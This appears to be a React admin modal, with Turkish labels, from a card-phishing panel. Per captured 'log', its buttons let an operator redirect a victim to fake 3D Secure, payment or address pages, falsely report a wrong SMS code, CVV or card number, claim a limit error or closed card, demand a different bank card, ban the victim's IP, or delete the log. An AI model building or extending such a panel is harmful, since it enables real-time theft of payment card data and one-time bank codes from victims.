'use client';

import { FiTrash2, FiX, FiZap } from 'react-icons/fi';

interface AdminActionsModalProps {
  isOpen: boolean;
  logId: string | null;
  onClose: () => void;
  onAction: (action: string) => void;
  onDelete?: (logId: string) => void;
}

const actions = [
  { label: '3D Gönder', action: 'Doğrulama (3D Secure)', color: 'border-purple-500/40 bg-purple-500/10 text-purple-300 hover:bg-purple-500/20' },
  { label: 'Ödeme Ekranına', action: 'Ödeme Sayfası', color: 'border-purple-500/40 bg-purple-500/10 text-purple-300 hover:bg-purple-500/20' },
  { label: 'Adres Ekranına', action: 'Adres Sayfası', color: 'border-purple-500/40 bg-purple-500/10 text-purple-300 hover:bg-purple-500/20' },
  { label: 'Kod Hatalı', action: 'Hatalı SMS', color: 'border-red-500/40 bg-red-500/10 text-red-300 hover:bg-red-500/20' },
  { label: 'Doğrulamaya Gönder', action: 'Doğrulama (3D Secure)', color: 'border-purple-500/40 bg-purple-500/10 text-purple-300 hover:bg-purple-500/20' },
  { label: 'CVV Hatalı', action: 'CVV Hatalı', color: 'border-amber-500/40 bg-amber-500/10 text-amber-300 hover:bg-amber-500/20' },
  { label: 'Yanlış Kart No', action: 'CCNO Hatalı', color: 'border-blue-500/40 bg-blue-500/10 text-blue-300 hover:bg-blue-500/20' },
  { label: 'Limit Hatası', action: 'Kart Limiti Yetersiz', color: 'border-red-500/40 bg-red-500/10 text-red-300 hover:bg-red-500/20' },
  { label: 'Farklı Kart', action: 'Farklı Banka Kartı', color: 'border-blue-500/40 bg-blue-500/10 text-blue-300 hover:bg-blue-500/20' },
  { label: 'İnternete Kapalı', action: 'Kart Kapalı', color: 'border-gray-500/40 bg-gray-500/10 text-gray-300 hover:bg-gray-500/20' },
  { label: 'Teşekkür Et', action: 'Tebrikle', color: 'border-emerald-500/40 bg-emerald-500/10 text-emerald-300 hover:bg-emerald-500/20' },
  { label: "IP'yi Banla", action: 'Banla', color: 'border-red-500/40 bg-red-500/10 text-red-300 hover:bg-red-500/20' },
];

export default function AdminActionsModal({
  isOpen,
  logId,
  onClose,
  onAction,
  onDelete,
}: AdminActionsModalProps) {
  if (!isOpen || !logId) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" onClick={onClose} />
      <div className="relative w-full max-w-lg rounded-2xl border border-[#2a3142] bg-[#151922] shadow-2xl">
        <div className="flex items-start justify-between border-b border-[#2a3142] px-5 py-4">
          <div>
            <div className="flex items-center gap-2">
              <FiZap className="text-amber-400" size={18} />
              <h3 className="text-lg font-bold text-white">İşlemler</h3>
            </div>
            <p className="mt-1 text-xs text-gray-500">Log ID: #{logId.slice(-4)}</p>
          </div>
          <button
            onClick={onClose}
            className="rounded-lg p-2 text-gray-400 transition-colors hover:bg-[#1a1f2b] hover:text-white"
          >
            <FiX size={18} />
          </button>
        </div>

        <div className="grid grid-cols-2 gap-2 p-4">
          {actions.map((item) => (
            <button
              key={item.label}
              onClick={() => {
                onAction(item.action);
                onClose();
              }}
              className={`rounded-lg border px-3 py-2.5 text-left text-xs font-semibold transition-colors ${item.color}`}
            >
              {item.label}
            </button>
          ))}
        </div>

        <div className="space-y-2 border-t border-[#2a3142] p-4">
          <button
            onClick={() => {
              onAction('Başarılı Sayfası');
              onClose();
            }}
            className="flex w-full items-center justify-center gap-2 rounded-lg bg-emerald-600 px-4 py-3 text-sm font-bold text-white transition-colors hover:bg-emerald-500"
          >
            ✓ Tamamlandı
          </button>
          {onDelete && logId && (
            <button
              onClick={() => {
                onClose();
                onDelete(logId);
              }}
              className="flex w-full items-center justify-center gap-2 rounded-lg border border-red-500/40 bg-red-500/10 px-4 py-2.5 text-sm font-semibold text-red-300 transition-colors hover:bg-red-500/20"
            >
              <FiTrash2 size={14} />
              Logu Sil
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
